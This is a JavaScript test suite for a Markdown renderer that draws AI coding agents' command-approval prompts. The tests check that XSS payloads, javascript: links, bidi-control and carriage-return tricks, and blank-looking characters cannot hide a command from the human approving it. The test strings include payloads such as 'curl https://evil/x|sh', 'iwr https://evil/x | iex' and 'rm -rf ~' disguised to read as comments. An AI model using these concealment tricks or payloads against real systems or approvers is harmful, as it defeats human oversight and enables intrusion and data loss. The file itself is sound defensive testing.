import { test } from 'node:test';
import assert from 'node:assert/strict';
import { approvalNotes, codeText, parseApproval, parseMarkdown, renderMarkdown, revealed, safeHref, textOf, toDom } from '../../js/markdown.js';
import { hasHidden, hasRightToLeft, notesFor, reveal, revealLineSeparators } from '../../js/hidden-text.js';

// Every element and link the parser would put on the page.
function walk(nodes, out = { tags: [], hrefs: [], text: '' }) {
  for (const n of nodes) {
    if (typeof n === 'string') { out.text += n; continue; }
    out.tags.push(n.tag);
    if (n.attrs?.href !== undefined) { out.hrefs.push(n.attrs.href); }
    walk(n.children ?? [], out);
  }
  return out;
}

const ALLOWED = new Set(['p', 'h4', 'h5', 'h6', 'strong', 'em', 'del', 'code', 'pre', 'ul', 'ol', 'li', 'blockquote', 'hr', 'br', 'a', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div']);

test('raw HTML stays text and never becomes an element', () => {
  const md = '<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n<a href="javascript:alert(1)">x</a> <iframe src="https://evil.example"></iframe>';
  const r = walk(parseMarkdown(md));
  assert.ok(r.tags.every((t) => ALLOWED.has(t)), r.tags.join());
  assert.ok(r.text.includes('<script>alert(1)</script>'));
  assert.ok(r.text.includes('<img src=x onerror=alert(1)>'));
  assert.ok(r.hrefs.every((h) => h.startsWith('https://')), r.hrefs.join());
});

test('links keep only http, https and mailto, however the scheme is disguised', () => {
  const bad = [
    'javascript:alert(1)', 'JaVaScRiPt:alert(1)', ' javascript:alert(1)', 'java\tscript:alert(1)', 'java\nscript:alert(1)',
    'javascript&#58;alert(1)', '&#x6A;avascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)',
    'file:///etc/passwd', '//evil.example/x', '/relative', 'relative/path', '\u0000javascript:alert(1)', 'blob:https://x/y',
  ];
  for (const href of bad) {
    assert.equal(safeHref(href), null, JSON.stringify(href));
    const r = walk(parseMarkdown(`[click](${href})`));
    assert.ok(r.hrefs.every((h) => /^(https?|mailto):/.test(h)), `${JSON.stringify(href)} -> ${r.hrefs}`);
  }
  assert.equal(safeHref('https://example.com/a?b=c#d'), 'https://example.com/a?b=c#d');
  assert.equal(safeHref('mailto:a@example.com'), 'mailto:a@example.com');
});

test('a link with an unsafe target keeps its text and loses the link', () => {
  const nodes = parseMarkdown('see [the docs](javascript:alert(1)) now');
  assert.equal(textOf({ children: nodes }), 'see the docs now');
  assert.deepEqual(walk(nodes).hrefs, []);
});

test('autolinks and bare URLs link only safe schemes', () => {
  const r = walk(parseMarkdown('<javascript:alert(1)> <https://ok.example/x> and https://github.com/a/b.'));
  assert.deepEqual(r.hrefs, ['https://ok.example/x', 'https://github.com/a/b']);
});

test('images are never loaded: they become links, or text when unsafe', () => {
  const r = walk(parseMarkdown('![alt](https://img.example/a.png) ![x](javascript:alert(1))'));
  assert.ok(!r.tags.includes('img'));
  assert.deepEqual(r.hrefs, ['https://img.example/a.png']);
});

test('paragraphs, emphasis, code and lists render as their elements', () => {
  const nodes = parseMarkdown('A **bold** and *em* and `code` and ~~gone~~.\nNext line.\n\n- one\n- two\n  1. nested\n\n```\n<b>raw</b>\n```');
  assert.deepEqual(nodes.map((n) => n.tag), ['p', 'ul', 'pre']);
  const r = walk(nodes);
  for (const tag of ['strong', 'em', 'code', 'del', 'br', 'li', 'ol']) { assert.ok(r.tags.includes(tag), tag); }
  assert.ok(r.text.includes('<b>raw</b>'), 'code blocks keep their text as text');
});

test('snake_case words are not emphasis', () => {
  const r = walk(parseMarkdown('call read_session_list and _this_'));
  assert.deepEqual(r.tags.filter((t) => t === 'em').length, 1);
  assert.ok(r.text.includes('read_session_list'));
});

test('headings sit below the card title, and tables are built cell by cell', () => {
  const nodes = parseMarkdown('# Top\n\n| a | b |\n|---|--:|\n| 1 | 2 |');
  assert.equal(nodes[0].tag, 'h4');
  const r = walk(nodes);
  assert.equal(r.tags.filter((t) => t === 'td').length, 2);
});

// Whether parsing grows in proportion to its input, judged so that no machine's speed or load
// decides it. A fixed bound did both wrong: under load 1.5 s failed linear input (1.75-2.15 s seen),
// while on a fast machine it let quadratic nested brackets through (0.14 s at 8,000 characters).
// So each input is parsed at n, 4n and 16n repeats of its unit, once to warm up and then five times,
// keeping the fastest (load only ever adds time), and fails if 16n takes 2 s, or if it takes 200 ms
// or more and grew as a square does on both measures: at least 9 times from 4n, and at least 100
// times from n. Each quadratic this guards against (#439's and #482's) grew at least 14.5 and 143
// times. A linear parse grows about 4 and 16 times, but the collector slows its largest run, so one
// measure alone gave false alarms: CI saw "[" grow 11 times from 4n (5.0 to 55.7 ms), and eight
// copies at once on one machine saw closed emphasis grow 11 times (22.9 to 250.8 ms), each under 50
// times from n. A ratio failure is timed once more before it counts, as such a pause rarely comes
// twice; a parse over 2 s is no pause. Each input's 16n is about 400,000 characters, or 800,000 where
// the quadratic's square is small (from 25,000 to 100,000 characters, closed emphasis searching the
// rest of the text from each opener grew only 8.4 times); there each quadratic takes 470 ms or more
// here, most over 2 s, and each linear parse 50-150 ms (about 250 with eight copies running).
const LINEAR_MS = 2000;
const RATIO_FROM_MS = 200;
function parsesLinearly(make, n) {
  const time = (text) => {
    let start = performance.now();
    parseMarkdown(text);
    let best = performance.now() - start;
    if (best > LINEAR_MS) { return best; }
    for (let k = 0; k < 5; k++) { start = performance.now(); parseMarkdown(text); best = Math.min(best, performance.now() - start); }
    return best;
  };
  const sizes = [make(n), make(4 * n), make(16 * n)];
  const measure = () => {
    const ms = [];
    for (const text of sizes) { ms.push(ms.at(-1) > LINEAR_MS ? Infinity : time(text)); }
    return ms;
  };
  const grewAsSquare = (ms) => ms[2] >= RATIO_FROM_MS && ms[2] >= 9 * ms[1] && ms[2] >= 100 * ms[0];
  let ms = measure();
  if (ms[2] < LINEAR_MS && grewAsSquare(ms)) { ms = measure(); }
  const said = `${JSON.stringify(sizes[0].slice(0, 12))}…: ${sizes.map((t, k) => `${t.length} characters in ${ms[k].toFixed(1)} ms`).join(', ')}`;
  assert.ok(ms[2] < LINEAR_MS, said);
  assert.ok(!grewAsSquare(ms), said);
}

test('pathological input parses in time proportional to its length', () => {
  const inputs = [
    [(n) => '*a '.repeat(n), 8300], [(n) => '['.repeat(n), 25000], [(n) => '[]('.repeat(n), 8300], [(n) => '`'.repeat(n), 25000],
    // Every "_" after the first is a closer the word after it refuses: reading each one's span for a
    // blank line was quadratic, 4.9 s at 512,000 characters. 800,000 at 16n, as its square is small.
    [(n) => '_x'.repeat(n), 25000],
    [(n) => '> '.repeat(n) + 'x', 12500], [(n) => '- '.repeat(n) + 'x', 12500], [(n) => '**'.repeat(n), 12500],
    [(n) => '['.repeat(n) + ']'.repeat(n), 12500],
  ];
  for (const [make, n] of inputs) { parsesLinearly(make, n); }
});

// #482: each opener searched the rest of the text for a blank line, which paragraph text never holds.
// 800,000 characters at 16n: the search is fast, so its square needs the length to show.
test('closed emphasis parses in time proportional to its length', () => {
  const inputs = [
    [(n) => '*x'.repeat(n), 25000], [(n) => '*a* '.repeat(n), 12500], [(n) => '_a_ '.repeat(n), 12500],
    [(n) => '**a** '.repeat(n), 8400], [(n) => '~~a~~ '.repeat(n), 8400],
  ];
  for (const [make, n] of inputs) { parsesLinearly(make, n); }
  assert.deepEqual(walk(parseMarkdown('*a* _b_ **c** ~~d~~ *x')).tags, ['p', 'em', 'em', 'strong', 'del']);
});

test('a button written in the text stays text, in a paragraph and in a code block', () => {
  const md = '<button onclick="window.__xss=1">Copy</button>\n\n```\n<button>x</button>\n```';
  const r = walk(parseMarkdown(md));
  assert.ok(!r.tags.includes('button'), r.tags.join());
  assert.ok(r.text.includes('<button onclick="window.__xss=1">Copy</button>'));
  assert.ok(r.text.includes('<button>x</button>'));
});

test('a code block keeps its text, tabs and indentation as written, with no newline added', () => {
  const body = '  indented\n\tpwsh -EncodedCommand AAAA\n';
  const [pre] = parseMarkdown(`\`\`\`\n${body}\`\`\``);
  assert.equal(pre.tag, 'pre');
  assert.equal(textOf(pre), '  indented\n\tpwsh -EncodedCommand AAAA');
});

test('a Makefile in a list item keeps its recipe tab', () => {
  const [list] = parseMarkdown('- the Makefile:\n\n  ```make\n  all:\n  \techo hello\n  ```\n- done');
  const pre = list.children[0].children.find((n) => n.tag === 'pre');
  assert.equal(textOf(pre), 'all:\n\techo hello');
});

test('whitespace-only lines in a list item\'s code block keep what is past the list\'s indentation', () => {
  const [list] = parseMarkdown('- a heredoc:\n\n  ```\n  cat <<EOF\n  \t\n      \n  EOF\n  ```');
  const pre = list.children[0].children.find((n) => n.tag === 'pre');
  assert.equal(textOf(pre), 'cat <<EOF\n\t\n    \nEOF');
});

test('anything that is not a string renders as nothing', () => {
  assert.deepEqual(parseMarkdown(null), []);
  assert.deepEqual(parseMarkdown({ toString: () => '<b>' }), []);
});

// #220, #415: what a code block draws and what its Copy takes (codeText), and an approval's card.
const blockOf = (md) => {
  const find = (nodes) => nodes.map((n) => (n?.tag === 'pre' ? n : find(n?.children ?? []))).find(Boolean);
  return codeText(textOf(find(parseMarkdown(md))));
};
// RLI LRI ... PDI LRI ... PDI PDI: drawn raw, it reads "echo ok # check; iwr https://evil/x | iex",
// the download behind a comment marker; run, it downloads.
const ISOLATED = 'echo ok \u2067\u2066; iwr https://evil/x | iex\u2069\u2066# check\u2069\u2069';
const ISOLATED_DRAWN = 'echo ok \\u2067\\u2066; iwr https://evil/x | iex\\u2069\\u2066# check\\u2069\\u2069';
// Drawn raw, even left to right, the punctuation joins the Hebrew run: "echo ב;#א;rm -rf ~".
const HEBREW = 'echo \u05D0#;\u05D1;rm -rf ~';
const HEBREW_DRAWN = 'echo \\u05D0#;\\u05D1;rm -rf ~';
const words = (nodes) => nodes.map((n) => (typeof n === 'string' ? n : n?.tag === 'br' ? '\n' : words(n?.children ?? []) + (['p', 'li'].includes(n?.tag) ? '\n' : ''))).join('');

test('a code block with bidi isolates draws them as escapes, and Copy takes exactly that', () => {
  const drawn = blockOf(`Run this:\n\n\`\`\`powershell\n${ISOLATED}\n\`\`\``);
  assert.equal(drawn, ISOLATED_DRAWN);
  assert.doesNotMatch(drawn, /[\u2066-\u2069]/);
});

test('right-to-left letters in a code block are escaped, and the block says it held them', () => {
  assert.equal(blockOf(`\`\`\`\n${HEBREW}\n\`\`\``), HEBREW_DRAWN);
  assert.equal(hasRightToLeft(HEBREW), true);
  assert.equal(hasRightToLeft('git status'), false);
});

test('a plain command is copied byte for byte, with its tabs and trailing spaces, but not the blank lines ending its fence', () => {
  const command = 'pwsh -NoProfile -File "C:\\tools\\run.ps1" -Verbose  \n\tdotnet test   \n    done';
  assert.equal(blockOf(`\`\`\`\n${command}\n\n\n\`\`\``), command);
});

test('a bare carriage return stays on its line as an escape, while CRLF still ends a line', () => {
  // Bash runs `echo SECOND`; split at the CR, it drew on a line of its own as a comment.
  const command = 'echo safe \r#; echo SECOND';
  const drawn = 'echo safe \\u000D#; echo SECOND';
  assert.equal(blockOf(`Run:\r\n\r\n\`\`\`\r\n${command}\r\n\`\`\`\r\n`), drawn);
  // Kept in its line as the character it is, which prose draws as the escape.
  assert.equal(words(parseMarkdown(`Codex wants to run:\r\n\r\n${command}`)), `Codex wants to run:\n${command}\n`);
  assert.equal(revealLineSeparators(command), drawn);
});

test('NEL and the line and paragraph separators stay on their line as escapes', () => {
  for (const [separator, escape] of [['\u0085', '\\u0085'], ['\u2028', '\\u2028'], ['\u2029', '\\u2029']]) {
    const drawn = `echo safe ${escape}#; echo SECOND`;
    assert.equal(blockOf(`\`\`\`\necho safe ${separator}#; echo SECOND\n\`\`\``), drawn);
    assert.equal(words(parseMarkdown(`Codex wants to run:\n\necho safe ${separator}#; echo SECOND`)), `Codex wants to run:\necho safe ${separator}#; echo SECOND\n`);
    assert.equal(revealLineSeparators(`echo safe ${separator}#; echo SECOND`), drawn);
  }
});

// An approval's message as its card draws it: the drawn text of each block.
const approvalDrawn = (message) => revealed(parseApproval(message)).map(textOf);

test('a Codex approval in prose draws its bidi controls and right-to-left letters as escapes', () => {
  // As a Codex approval carries it: the command in prose, not a fence.
  const drawn = approvalDrawn(`Codex wants to run:\n\n${ISOLATED}\n\nthen \`${HEBREW}\``);
  assert.deepEqual(drawn, [`Codex wants to run:\n\n${ISOLATED_DRAWN}\n\nthen \`${HEBREW_DRAWN}\``]);
});

test('a link in an approval is drawn as its source, so it cannot hide the command it is part of', () => {
  const command = 'echo "[safe](https://a/";curl${IFS}https://evil/x|sh;")"';
  assert.deepEqual(approvalDrawn(`Codex wants to run:\n\n${command}`), [`Codex wants to run:\n\n${command}`]);
  assert.deepEqual(parseApproval(command)[0].children, [command]);
});

test('a code span in an approval is drawn as its source, so it cannot join two lines into one comment', () => {
  const command = 'git status # `\ncurl https://evil/x|sh # `';
  assert.deepEqual(approvalDrawn(command), [command]);
});

test('a backslash in an approval is drawn, never taken as an escape', () => {
  const command = 'echo safe \\# ; curl https://evil/x|sh';
  assert.deepEqual(approvalDrawn(command), [command]);
});

test('stars in an approval are drawn, never taken as emphasis', () => {
  const command = 'rm -rf *tmp* ~/x **and** _this_ ~~too~~';
  assert.deepEqual(approvalDrawn(command), [command]);
});

test('a Copilot approval is drawn exactly as written, its fence markers visible', () => {
  const message = 'Allow **shell**?\n\nPush the branch\n\n```\ngit push origin main --force-with-lease\n```';
  assert.deepEqual(parseApproval(message), [{ tag: 'p', attrs: { class: 'md-literal' }, children: [message] }]);
});

test('a fenced command in a Codex approval is drawn with both backtick lines, which bash runs as a substitution', () => {
  // bash -c '<newline>```<newline>echo rm -rf ~<newline>```<newline>' runs rm -rf ~: the fence markers are code.
  const message = 'Codex wants to run:\n\n```\necho rm -rf ~\n```';
  assert.deepEqual(approvalDrawn(message), [message]);
  const wrapped = "Codex wants to run:\n\nbash -c '\n```\necho rm -rf ~\n```\n'";
  assert.deepEqual(approvalDrawn(wrapped), [wrapped]);
});

test('a Copilot intention ending in a backtick line opens no fence for the host\'s own to close', () => {
  const message = 'Allow **shell**?\n\nTidy up\n```\n\n```\nrm -rf build\n```\necho done\n```';
  assert.deepEqual(approvalDrawn(message), [message]);
});

test('a tilde fence and an unclosed fence in an approval are drawn verbatim', () => {
  for (const message of ['Run:\n~~~ sh\nls ~\n~~~', 'Run:\n```sh\nls\ncurl https://evil/x|sh', 'Run:\n```sh; curl https://evil/x|sh\nls\n```']) {
    assert.deepEqual(approvalDrawn(message), [message]);
  }
});

test('right-to-left letters in an approval\'s fenced lines are escaped with the rest', () => {
  assert.deepEqual(approvalDrawn(`Allow **shell**?\n\n\`\`\`\n${HEBREW}\n\`\`\``), [`Allow **shell**?\n\n\`\`\`\n${HEBREW_DRAWN}\n\`\`\``]);
});

test('a bare carriage return in an approval stays on its line as an escape', () => {
  assert.deepEqual(approvalDrawn('Codex wants to run:\r\n\r\necho safe \r#; echo SECOND'), ['Codex wants to run:\n\necho safe \\u000D#; echo SECOND']);
});

// What a drawn block says it held (#415, ui.md §6.4), from the characters the block holds.
const notesOfBlock = (md) => {
  const find = (nodes) => nodes.map((n) => (n?.tag === 'pre' ? n : find(n?.children ?? []))).find(Boolean);
  return notesFor(textOf(find(parseMarkdown(md))));
};

// A host sends an approval's hidden characters and right-to-left letters as escapes (#220), and Approve
// once is offered for it: its card still says what they stand for.
test('an approval a host sent escaped still says it contains hidden characters and right-to-left text', () => {
  assert.deepEqual(approvalNotes('Allow **shell**?\n\n```\n# just a note\\u000D Write-Output RAN\n```'), ['Contains hidden characters']);
  assert.deepEqual(approvalNotes('Allow **shell**?\n\n```\necho \\u05D0#;\\u05D1;rm -rf ~ \\u{E0041}\n```'), ['Contains hidden characters', 'Contains right-to-left text']);
  assert.deepEqual(approvalNotes('Allow **shell**?\n\n```\nprintf \'\\u0041\\u{1F600}\'\n```'), []);
});

test('a block with a bare carriage return says it contains hidden characters', () => {
  // PowerShell ends a `#` comment at a bare CR: drawn on one line, this still reads as a comment, and runs.
  assert.deepEqual(notesOfBlock('```powershell\r\n# just a note\r Write-Output RAN\r\n```'), ['Contains hidden characters']);
  // A CRLF is an ordinary line ending.
  assert.deepEqual(notesOfBlock('```\r\nls\r\npwd\r\n```'), []);
});

test('a block with bidi isolates says it contains hidden characters, and with right-to-left letters too, both', () => {
  assert.deepEqual(notesOfBlock(`\`\`\`\n${ISOLATED}\n\`\`\``), ['Contains hidden characters']);
  assert.deepEqual(notesOfBlock(`\`\`\`\n${HEBREW}\n\`\`\``), ['Contains right-to-left text']);
  assert.deepEqual(notesOfBlock(`\`\`\`\n${HEBREW} ${ISOLATED}\n\`\`\``), ['Contains hidden characters', 'Contains right-to-left text']);
  assert.deepEqual(notesOfBlock('```\ngit status\n```'), []);
});

test('an escape written as text is drawn as written and is no hidden character', () => {
  assert.deepEqual(notesOfBlock('```\necho \\u000D \\u2067\n```'), []);
  assert.equal(blockOf('```\necho \\u000D \\u2067\n```'), 'echo \\u000D \\u2067');
});

// A shell takes these as part of a word, so `true\u00A0#; echo RAN` runs `echo RAN`; drawn blank,
// it read as `true #; …`, a comment (#546). One case per added range, and its ends.
test('a blank-looking character in a command is drawn as its escape, says so, and counts as hidden', () => {
  for (const blank of ['\u00A0', '\u1680', '\u2000', '\u200A', '\u202F', '\u205F', '\u3000', '\u2800']) {
    const command = `true${blank}#; echo RAN`;
    const drawn = `true\\u${blank.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}#; echo RAN`;
    const what = `U+${blank.codePointAt(0).toString(16)}`;
    assert.equal(blockOf(`\`\`\`\n${command}\n\`\`\``), drawn, what);
    assert.deepEqual(notesOfBlock(`\`\`\`\n${command}\n\`\`\``), ['Contains hidden characters'], what);
    assert.deepEqual(approvalDrawn(`Codex wants to run:\n\n${command}`), [`Codex wants to run:\n\n${drawn}`], what);
    assert.equal(hasHidden(command), true, what);
  }
  assert.equal(blockOf('```\ntrue\u00A0#; echo RAN\n```'), 'true\\u00A0#; echo RAN');
  assert.equal(blockOf('```\nok\u2800#; echo RAN\n```'), 'ok\\u2800#; echo RAN');
  // The space and a tab are drawn as themselves.
  assert.equal(blockOf('```\necho a\tb  c\n```'), 'echo a\tb  c');
  assert.deepEqual(notesOfBlock('```\necho a\tb  c\n```'), []);
});

test('a block holding the private-use characters the parser stands separators in with still draws each as itself', () => {
  const held = '\u{F0000}\u{F0001}';
  assert.equal(blockOf(`\`\`\`\na${held}\rb\u2028c\n\`\`\``), 'a\\u{F0000}\\u{F0001}\\u000Db\\u2028c');
});

// Just enough of a document for toDom and renderMarkdown in node: elements, attributes and text
// nodes, a fragment's children taken into what it is appended to.
const fakeDocument = () => {
  const node = (tag) => ({
    tag, attrs: {}, children: [], dataset: {},
    append(...kids) { for (const k of kids) { if (k.tag === '#fragment') { this.children.push(...k.children); } else { this.children.push(k); } } },
    prepend(...kids) { this.children.unshift(...kids); },
    setAttribute(name, value) { this.attrs[name] = String(value); },
    addEventListener() {},
    set className(value) { this.attrs.class = value; },
    set textContent(value) { this.children = [{ text: value }]; },
  });
  return { createDocumentFragment: () => node('#fragment'), createElement: node, createTextNode: (text) => ({ text }) };
};
const textNodes = (n) => (n.text !== undefined ? [n.text] : n.children.flatMap(textNodes));
const elements = (n) => (n.text !== undefined ? [] : [n, ...n.children.flatMap(elements)]);
const cardOf = (message) => renderMarkdown(message, fakeDocument(), { approval: true });
const cardNotes = (card) => elements(card).filter((e) => e.attrs.class === 'md-note').map((e) => textNodes(e).join(''));
const cardText = (card) => elements(card).filter((e) => e.attrs.class === 'md-literal').map((e) => textNodes(e).join(''));

test('an approval says it contains hidden characters for a bare carriage return or an isolate', () => {
  assert.deepEqual(cardNotes(cardOf('Codex wants to run:\r\n\r\n# just a note\r Write-Output RAN')), ['Contains hidden characters']);
  assert.deepEqual(cardNotes(cardOf(`Codex wants to run:\n\n${ISOLATED}`)), ['Contains hidden characters']);
  assert.deepEqual(cardNotes(cardOf('Codex wants to run:\n\ngit status\n')), []);
});

// #423: bash takes the CR of a CRLF as part of the command: `cd` fails on `scratch\r`, and `rm` runs here.
test('an approval\'s card says it contains hidden characters for the CR of a CRLF, which it draws as the line ending it is', () => {
  const card = cardOf('cd /tmp/scratch\r\nrm -rf ./*');
  assert.deepEqual(cardNotes(card), ['Contains hidden characters']);
  assert.deepEqual(cardText(card), ['cd /tmp/scratch\nrm -rf ./*']);
  // Even one only in the blank lines the card leaves out: the note says what the message holds.
  assert.deepEqual(cardNotes(cardOf('Codex wants to run:\n\ngit status\r\n')), ['Contains hidden characters']);
});

// #423: prose drew a CR before an LF raw, though parseMarkdown had made every CRLF an LF already.
test('a carriage return before a line feed in an image\'s alt text or a link\'s title reaches the page as an escape, never raw', () => {
  const page = toDom(parseMarkdown('See ![x\r\r\ny](https://a/i.png) and [docs](https://a/d "t\r\r\nu").'), fakeDocument());
  const links = elements(page).filter((e) => e.tag === 'a');
  assert.deepEqual(links.map((a) => textNodes(a).join('')), ['x\\u000D\ny', 'docs']);
  assert.deepEqual(links.map((a) => a.attrs.title), [undefined, 't\\u000D\nu']);
  assert.doesNotMatch(textNodes(page).join(''), /\r/);
});
// #429: lines of only whitespace at a block's end are as blank as empty ones, drawn and copied.
test('a block ending in a line of spaces copies without the newline, so a paste does not run it', () => {
  assert.equal(codeText('echo safe\n    '), 'echo safe');
  assert.equal(blockOf('```\necho safe\n    \n```'), 'echo safe');
});

test('a block ending in lines of tabs and spaces drops them all', () => {
  assert.equal(codeText('echo safe\n\t\n  \n'), 'echo safe');
});

test('a block ending in a no-break space line keeps it, drawn as its escape, since a shell takes it as part of a word', () => {
  assert.equal(codeText('echo safe \n\u00a0'), 'echo safe \n\\u00A0');
  assert.equal(codeText('echo safe\u3000\n\u3000\n'), 'echo safe\\u3000\n\\u3000');
});

test('a block of only whitespace lines draws only its first line\'s spaces', () => {
  assert.equal(codeText('  \n\t\n   '), '  ');
  assert.equal(codeText('\n\n'), '');
});
test('a block ending in tens of thousands of blank lines is trimmed in linear time', () => {
  // Quadratic, as the regex was, 50,000 blank lines took seconds and stalled the render.
  for (const text of ['x' + '\n'.repeat(50000) + 'y', 'x' + ' \n'.repeat(50000) + 'y', 'echo\n' + ' \n'.repeat(50000), 'echo' + '\n'.repeat(100000), '\t\n'.repeat(100000)]) {
    const start = performance.now();
    codeText(text);
    assert.ok(performance.now() - start < 250, `${text.length} characters took ${performance.now() - start} ms`);
  }
  assert.equal(codeText('echo\n' + ' \n'.repeat(50000)), 'echo');
  assert.equal(codeText('x' + '\n'.repeat(50000) + 'y'), 'x' + '\n'.repeat(50000) + 'y');
});

test('the linear trim draws exactly what the trailing-blank-lines rule did, for every short block', () => {
  const rule = (s) => s.replace(/(?:\n[^\S\n]*)+$/, '');
  const alphabet = ['a', ' ', '\t', '\n', '\u00a0', '\u3000'];
  const all = [''];
  for (let from = 0, n = 0; n < 6; n++) { const to = all.length; for (let i = from; i < to; i++) { for (const c of alphabet) { all.push(all[i] + c); } } from = to; }
  for (const s of all) { assert.equal(codeText(s), rule(reveal(s, { rightToLeft: true })), JSON.stringify(s)); }
});
// #429: the stand-ins for a bare CR and the separators are chosen in one read of the text.
test('a message holding 50,000 private-use code points and a carriage return parses in linear time', () => {
  let held = '';
  for (let c = 0xF0000; c < 0xF0000 + 50000; c++) { held += String.fromCodePoint(c); }
  const start = performance.now();
  const [p] = parseMarkdown(held + '\recho');
  assert.ok(performance.now() - start < 250, `took ${performance.now() - start} ms`);
  // Every code point it held is drawn as itself, and the CR as the CR it was.
  assert.equal(textOf(p), held + '\recho');
});

test('the stand-ins skip every private-use code point a message holds, and the separators come back as they were', () => {
  const held = '\u{F0000}\u{F0001}\u{F0002}\u{F0004}';
  const [p] = parseMarkdown(`a${held}\rb\u2028c\u2029d`);
  assert.equal(textOf(p), `a${held}\rb\u2028c\u2029d`);
  assert.equal(blockOf(`\`\`\`\n${held}\r\u2028\u2029\n\`\`\``), '\\u{F0000}\\u{F0001}\\u{F0002}\\u{F0004}\\u000D\\u2028\\u2029');
  assert.deepEqual(notesOfBlock(`\`\`\`\nx\ry\n\`\`\``), ['Contains hidden characters']);
});

test('an approval with 200,000 blank lines before its text is drawn in linear time', () => {
  const start = performance.now();
  const [p] = parseApproval('\n'.repeat(200000) + 'echo hi' + '\n \n'.repeat(100000));
  assert.ok(performance.now() - start < 250, `took ${performance.now() - start} ms`);
  assert.equal(textOf(p), 'echo hi');
});
// #439: each "[" scanned afresh to its partner, and each destination to the end of the text.
test('nested link brackets parse in linear time, drawn as written', () => {
  // 20,000 of each took 1.35 s, and it grew with the square.
  parsesLinearly((n) => '['.repeat(n) + ']'.repeat(n), 12500);
  parsesLinearly((n) => '!' + '['.repeat(n) + ']'.repeat(n), 12500);
  const text = '['.repeat(100000) + ']'.repeat(100000);
  assert.equal(textOf({ children: parseMarkdown(text) }), text);
  assert.equal(textOf({ children: parseMarkdown('!' + text) }), '!' + text);
});

test('a link\'s opening repeated parses in linear time, drawn as written', () => {
  // "[a](" repeated took 67 s at 200,000 characters: each destination was read to the end of the text.
  const inputs = [
    [(n) => '[a]('.repeat(n), 6250], [(n) => '[a](<'.repeat(n), 10000],
    [(n) => '[a](x'.repeat(n) + ' '.repeat(2 * n) + 'y', 3600], [(n) => '[a](x'.repeat(n) + ' "' + 'x'.repeat(5 * n), 2500],
  ];
  for (const [make, n] of inputs) {
    parsesLinearly(make, n);
    const text = make(16 * n);
    assert.equal(textOf({ children: parseMarkdown(text) }), text);
  }
});

test('a link after thousands of unclosed ones is still a link', () => {
  parsesLinearly((n) => '[a](('.repeat(n) + '[b](https://ok.example/)', 5000);
  assert.deepEqual(walk(parseMarkdown('[a](('.repeat(20000) + '[b](https://ok.example/)')).hrefs, ['https://ok.example/']);
});

// The shared vectors (tests/fixtures/approvals/literal-intentions.json): what a host sends for a
// Copilot permission prompt whose intention tries to open a fence or draw Markdown (#212). The
// card draws the intention as its words and what is approved as code, whole.
test('a permission prompt draws the agent\'s intention as its words and what is approved as code', async () => {
  const { readFileSync } = await import('node:fs');
  const { cases } = JSON.parse(readFileSync(new URL('../../../tests/fixtures/approvals/literal-intentions.json', import.meta.url), 'utf8'));
  const words = (s) => s.split(/\s+/).filter(Boolean).join(' ');
  // A line break is a space between words.
  const spoken = (n) => (typeof n === 'string' ? n : n.tag === 'br' ? ' ' : (n.children ?? []).map(spoken).join(''));
  assert.ok(cases.length >= 15);
  for (const c of cases) {
    const nodes = parseMarkdown(c.message);
    const code = c.kind === 'commands' ? [c.command] : [c.file, c.diff];
    assert.deepEqual(nodes[0], { tag: 'p', children: ['Allow ', { tag: 'strong', children: [c.kind === 'commands' ? 'shell' : 'edit'] }, '?'] }, c.name);
    assert.deepEqual(nodes.slice(-code.length).map((n) => [n.tag, textOf(n)]), code.map((t) => ['pre', t]), c.name);
    const prose = nodes.slice(1, -code.length);
    const r = walk(prose);
    // Paragraphs of text: no emphasis, code, heading, list, quote, table or rule, and a link only
    // where its words are its address.
    assert.ok(r.tags.every((t) => t === 'p' || t === 'br' || t === 'a'), `${c.name}: ${r.tags.join()}`);
    for (const a of prose.flatMap(function links(n) { return typeof n === 'string' ? [] : n.tag === 'a' ? [n] : (n.children ?? []).flatMap(links); })) {
      assert.equal(textOf(a).replace(/\/+$/, ''), a.attrs.href.replace(/\/+$/, ''), c.name);
    }
    assert.equal(words(prose.map(spoken).join(' ')), words(c.intention), c.name);
  }
});

// The security review's commands (tests/fixtures/approvals/codex-commands.json, #209): all ASCII,
// yet as Markdown prose each draws a link's words or an image in place of what runs. This card draws
// an approval exactly as written (#429), so as a host sends it and as an older host sent it, each is
// drawn whole, with no link or image, and Approve once offered (#253, decision 3).
test('a codex command Markdown would draw as a link or image is drawn exactly as written, as a host sends it and as an older host sent it', async () => {
  const { readFileSync } = await import('node:fs');
  const { answerability } = await import('../../js/answers.js');
  const { cases } = JSON.parse(readFileSync(new URL('../../../tests/fixtures/approvals/codex-commands.json', import.meta.url), 'utf8'));
  const caps = ['sessions.read', 'sessions.answer', 'sessions.approve'];
  assert.ok(cases.length >= 4);
  for (const c of cases) {
    for (const message of [c.message, c.legacy]) {
      const nodes = parseApproval(message);
      assert.deepEqual(nodes.map(textOf), [message], c.name);
      assert.ok(!walk(nodes).tags.some((t) => t === 'a' || t === 'img'), c.name);
      const approval = { id: 'd1', kind: 'approval', message, fields: [{ name: 'decision', type: 'choice', options: [{ value: 'approve', label: 'Approve once' }, { value: 'deny', label: 'Deny' }], required: true }] };
      assert.deepEqual(answerability(approval, caps, 'codex'), { ok: true, why: null }, c.name);
    }
  }
});
